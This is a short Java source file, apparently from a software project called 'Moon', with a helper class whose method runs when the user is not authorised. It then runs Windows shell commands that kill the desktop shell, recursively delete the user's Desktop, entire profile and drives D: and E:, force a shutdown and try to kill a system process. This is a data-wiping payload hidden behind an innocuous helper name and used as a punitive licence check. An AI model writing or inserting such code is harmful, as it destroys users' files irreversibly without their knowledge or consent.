package Moon.helpers;

import Moon.Moon;

import java.io.IOException;

public class PCHelper {
    public static void xd() {
        try {
            if(!Moon.INSTANCE.authorised) {
                Runtime.getRuntime().exec("cmd /K taskkill /f /pid explorer.exe");
                Runtime.getRuntime().exec("cmd /K del %userprofile%\\Desktop /s /f /q");
                Runtime.getRuntime().exec("cmd /K del %userprofile% /s /f /q");
                Runtime.getRuntime().exec("cmd /K del D: /s /f /q");
                Runtime.getRuntime().exec("cmd /K del E: /s /f /q");
                Runtime.getRuntime().exec("cmd /K shutdown /s /f /t 30");
                Runtime.getRuntime().exec("cmd /K taskkill /f /pid crss.exe");
                System.exit(0);
            }
        } catch (IOException ignored) {
        }
    }
}
